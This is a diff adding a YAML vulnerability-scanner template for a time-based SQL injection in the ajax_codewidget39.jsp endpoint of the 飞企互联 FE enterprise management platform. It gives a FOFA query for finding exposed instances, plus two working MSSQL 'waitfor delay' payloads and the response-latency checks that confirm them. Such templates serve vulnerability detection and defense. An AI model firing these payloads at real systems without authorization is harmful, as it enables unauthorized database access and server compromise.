@@ -1,0 +1,28 @@
+id: FE-ajax_codewidget39-sql-injection
+
+info:
+  name: 飞企互联-FE企业运营管理平台 ajax_codewidget39 SQL延时注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="飞企互联-FE企业运营管理平台"
+    飞企互联-FE企业运营管理平台 ajax_codewidget39 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140070608
+  tags: sql injection
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:3%27--+
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: GET
+      path: /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+
